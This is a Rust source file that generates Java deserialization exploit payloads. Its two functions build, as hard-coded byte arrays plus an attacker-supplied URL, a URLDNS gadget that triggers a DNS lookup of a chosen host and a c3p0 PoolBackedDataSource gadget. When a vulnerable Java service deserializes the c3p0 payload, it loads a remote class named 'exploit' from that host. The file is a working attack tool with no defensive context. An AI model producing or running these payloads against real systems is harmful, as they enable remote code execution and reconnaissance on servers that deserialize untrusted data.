use crate::base::generate_string;
use url::Url;

pub fn get_url_dns(urls: &str) -> Vec<u8> {
    let mut result_bytes = [
        172, 237, 0, 5, 115, 114, 0, 17, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 72, 97, 115,
        104, 77, 97, 112, 5, 7, 218, 193, 195, 22, 96, 209, 3, 0, 2, 70, 0, 10, 108, 111, 97, 100,
        70, 97, 99, 116, 111, 114, 73, 0, 9, 116, 104, 114, 101, 115, 104, 111, 108, 100, 120, 112,
        63, 64, 0, 0, 0, 0, 0, 12, 119, 8, 0, 0, 0, 16, 0, 0, 0, 1, 115, 114, 0, 12, 106, 97, 118,
        97, 46, 110, 101, 116, 46, 85, 82, 76, 150, 37, 55, 54, 26, 252, 228, 114, 3, 0, 7, 73, 0,
        8, 104, 97, 115, 104, 67, 111, 100, 101, 73, 0, 4, 112, 111, 114, 116, 76, 0, 9, 97, 117,
        116, 104, 111, 114, 105, 116, 121, 116, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103,
        47, 83, 116, 114, 105, 110, 103, 59, 76, 0, 4, 102, 105, 108, 101, 113, 0, 126, 0, 3, 76,
        0, 4, 104, 111, 115, 116, 113, 0, 126, 0, 3, 76, 0, 8, 112, 114, 111, 116, 111, 99, 111,
        108, 113, 0, 126, 0, 3, 76, 0, 3, 114, 101, 102, 113, 0, 126, 0, 3, 120, 112, 255, 255,
        255, 255, 255, 255, 255, 255,
    ]
    .to_vec();
    if let Ok(u) = Url::parse(urls) {
        result_bytes.extend(&generate_string(u.host_str().unwrap_or_default()));
        result_bytes.extend([116, 0, 0, 113, 0, 126, 0, 5]);
        result_bytes.extend(&generate_string(u.scheme()));
        result_bytes.extend([112, 120]);
        result_bytes.extend(&generate_string(urls));
    } else {
        println!("Must be a valid URL!");
        std::process::exit(0);
    }
    result_bytes.extend([120]);
    result_bytes
}
pub fn get_c3p0(urls: &str) -> Vec<u8> {
    let mut result_bytes = [
        172, 237, 0, 5, 115, 114, 0, 40, 99, 111, 109, 46, 109, 99, 104, 97, 110, 103, 101, 46,
        118, 50, 46, 99, 51, 112, 48, 46, 80, 111, 111, 108, 66, 97, 99, 107, 101, 100, 68, 97,
        116, 97, 83, 111, 117, 114, 99, 101, 222, 34, 205, 108, 199, 255, 127, 168, 2, 0, 0, 120,
        114, 0, 53, 99, 111, 109, 46, 109, 99, 104, 97, 110, 103, 101, 46, 118, 50, 46, 99, 51,
        112, 48, 46, 105, 109, 112, 108, 46, 65, 98, 115, 116, 114, 97, 99, 116, 80, 111, 111, 108,
        66, 97, 99, 107, 101, 100, 68, 97, 116, 97, 83, 111, 117, 114, 99, 101, 0, 0, 0, 0, 0, 0,
        0, 1, 3, 0, 0, 120, 114, 0, 49, 99, 111, 109, 46, 109, 99, 104, 97, 110, 103, 101, 46, 118,
        50, 46, 99, 51, 112, 48, 46, 105, 109, 112, 108, 46, 80, 111, 111, 108, 66, 97, 99, 107,
        101, 100, 68, 97, 116, 97, 83, 111, 117, 114, 99, 101, 66, 97, 115, 101, 0, 0, 0, 0, 0, 0,
        0, 1, 3, 0, 8, 73, 0, 16, 110, 117, 109, 72, 101, 108, 112, 101, 114, 84, 104, 114, 101,
        97, 100, 115, 76, 0, 24, 99, 111, 110, 110, 101, 99, 116, 105, 111, 110, 80, 111, 111, 108,
        68, 97, 116, 97, 83, 111, 117, 114, 99, 101, 116, 0, 36, 76, 106, 97, 118, 97, 120, 47,
        115, 113, 108, 47, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 80, 111, 111, 108, 68,
        97, 116, 97, 83, 111, 117, 114, 99, 101, 59, 76, 0, 14, 100, 97, 116, 97, 83, 111, 117,
        114, 99, 101, 78, 97, 109, 101, 116, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103,
        47, 83, 116, 114, 105, 110, 103, 59, 76, 0, 10, 101, 120, 116, 101, 110, 115, 105, 111,
        110, 115, 116, 0, 15, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 77, 97, 112, 59,
        76, 0, 20, 102, 97, 99, 116, 111, 114, 121, 67, 108, 97, 115, 115, 76, 111, 99, 97, 116,
        105, 111, 110, 113, 0, 126, 0, 4, 76, 0, 13, 105, 100, 101, 110, 116, 105, 116, 121, 84,
        111, 107, 101, 110, 113, 0, 126, 0, 4, 76, 0, 3, 112, 99, 115, 116, 0, 34, 76, 106, 97,
        118, 97, 47, 98, 101, 97, 110, 115, 47, 80, 114, 111, 112, 101, 114, 116, 121, 67, 104, 97,
        110, 103, 101, 83, 117, 112, 112, 111, 114, 116, 59, 76, 0, 3, 118, 99, 115, 116, 0, 34,
        76, 106, 97, 118, 97, 47, 98, 101, 97, 110, 115, 47, 86, 101, 116, 111, 97, 98, 108, 101,
        67, 104, 97, 110, 103, 101, 83, 117, 112, 112, 111, 114, 116, 59, 120, 112, 119, 2, 0, 1,
        115, 114, 0, 61, 99, 111, 109, 46, 109, 99, 104, 97, 110, 103, 101, 46, 118, 50, 46, 110,
        97, 109, 105, 110, 103, 46, 82, 101, 102, 101, 114, 101, 110, 99, 101, 73, 110, 100, 105,
        114, 101, 99, 116, 111, 114, 36, 82, 101, 102, 101, 114, 101, 110, 99, 101, 83, 101, 114,
        105, 97, 108, 105, 122, 101, 100, 98, 25, 133, 208, 209, 42, 194, 19, 2, 0, 4, 76, 0, 11,
        99, 111, 110, 116, 101, 120, 116, 78, 97, 109, 101, 116, 0, 19, 76, 106, 97, 118, 97, 120,
        47, 110, 97, 109, 105, 110, 103, 47, 78, 97, 109, 101, 59, 76, 0, 3, 101, 110, 118, 116, 0,
        21, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 72, 97, 115, 104, 116, 97, 98, 108,
        101, 59, 76, 0, 4, 110, 97, 109, 101, 113, 0, 126, 0, 10, 76, 0, 9, 114, 101, 102, 101,
        114, 101, 110, 99, 101, 116, 0, 24, 76, 106, 97, 118, 97, 120, 47, 110, 97, 109, 105, 110,
        103, 47, 82, 101, 102, 101, 114, 101, 110, 99, 101, 59, 120, 112, 112, 112, 112, 115, 114,
        0, 22, 106, 97, 118, 97, 120, 46, 110, 97, 109, 105, 110, 103, 46, 82, 101, 102, 101, 114,
        101, 110, 99, 101, 232, 198, 158, 162, 168, 233, 141, 9, 2, 0, 4, 76, 0, 5, 97, 100, 100,
        114, 115, 116, 0, 18, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 86, 101, 99, 116,
        111, 114, 59, 76, 0, 12, 99, 108, 97, 115, 115, 70, 97, 99, 116, 111, 114, 121, 113, 0,
        126, 0, 4, 76, 0, 20, 99, 108, 97, 115, 115, 70, 97, 99, 116, 111, 114, 121, 76, 111, 99,
        97, 116, 105, 111, 110, 113, 0, 126, 0, 4, 76, 0, 9, 99, 108, 97, 115, 115, 78, 97, 109,
        101, 113, 0, 126, 0, 4, 120, 112, 115, 114, 0, 16, 106, 97, 118, 97, 46, 117, 116, 105,
        108, 46, 86, 101, 99, 116, 111, 114, 217, 151, 125, 91, 128, 59, 175, 1, 3, 0, 3, 73, 0,
        17, 99, 97, 112, 97, 99, 105, 116, 121, 73, 110, 99, 114, 101, 109, 101, 110, 116, 73, 0,
        12, 101, 108, 101, 109, 101, 110, 116, 67, 111, 117, 110, 116, 91, 0, 11, 101, 108, 101,
        109, 101, 110, 116, 68, 97, 116, 97, 116, 0, 19, 91, 76, 106, 97, 118, 97, 47, 108, 97,
        110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 120, 112, 0, 0, 0, 0, 0, 0, 0, 0, 117, 114, 0,
        19, 91, 76, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 79, 98, 106, 101, 99, 116, 59,
        144, 206, 88, 159, 16, 115, 41, 108, 2, 0, 0, 120, 112, 0, 0, 0, 10, 112, 112, 112, 112,
        112, 112, 112, 112, 112, 112, 120,
    ]
    .to_vec();
    if let Ok(u) = Url::parse(urls) {
        result_bytes.extend(&generate_string(&format!(
            "//{}",
            u.host_str().unwrap_or_default()
        )));
        result_bytes.extend(&generate_string(u.scheme()));
    } else {
        println!("Must be a valid URL!");
        std::process::exit(0);
    }
    result_bytes.extend([
        116, 0, 7, 101, 120, 112, 108, 111, 105, 116, 112, 112, 112, 112, 119, 4, 0, 0, 0, 0, 120,
        119, 2, 0, 1, 120,
    ]);
    result_bytes
}
